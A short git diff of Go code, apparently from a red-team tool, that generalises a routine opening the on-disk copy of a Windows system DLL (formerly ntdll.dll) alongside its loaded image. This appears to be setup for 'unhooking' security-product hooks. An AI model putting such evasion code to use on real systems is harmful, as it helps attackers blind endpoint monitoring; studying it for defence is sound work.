@@ -84,12 +84,12 @@ func IMAGE_FIRST_SECTION(ntheader *PIMAGE_NT_HEADERS64) *PIMAGE_SECTION_HEADER {
 	))
 }
 
-func Dll() {
+func Dll(DllName string) {
 	//sys GetCurrentProcessNu1r()(process uintptr)=Kernel32.GetCurrentProcess
 	process := GetCurrentProcessNu1r()
 	var mi windows.ModuleInfo
 	//sys GetModuleHandleANu1r(lpModuleName uintptr)(ntdllModule uintptr)=Kernel32.GetModuleHandleA
-	p1, _ := syscall.UTF16PtrFromString("ntdll.dll")
+	p1, _ := syscall.UTF16PtrFromString(DllName)
 	ntdllModule := GetModuleHandleANu1r(uintptr(unsafe.Pointer(p1)))
 	//sys GetModuleInformationNu1r(hProcess uintptr,hModule uintptr,lpmodinfo uintptr,cb uintptr)=Psapi.GetModuleInformation
 	GetModuleInformationNu1r(
@@ -98,7 +98,7 @@ func Dll() {
 		unsafe.Sizeof(mi),
 	)
 	ntdllBase := unsafe.Pointer(mi.BaseOfDll)
-	p2, _ := syscall.UTF16PtrFromString("c:\\windows\\system32\\ntdll.dll")
+	p2, _ := syscall.UTF16PtrFromString("c:\\windows\\system32\\" + DllName)
 	//sys CreateFileANu1r(lpFileName uintptr,dwDesiredAccess uintptr,dwShareMode uintptr,lpSecurityAttributes uintptr,dwCreationDisposition uintptr,dwFlagsAndAttributes uintptr,hTemplateFile uintptr)(ntdllFile uintptr)=Kernel32.CreateFileA
 	ntdllFile := CreateFileANu1r(
 		uintptr(unsafe.Pointer(p2)),
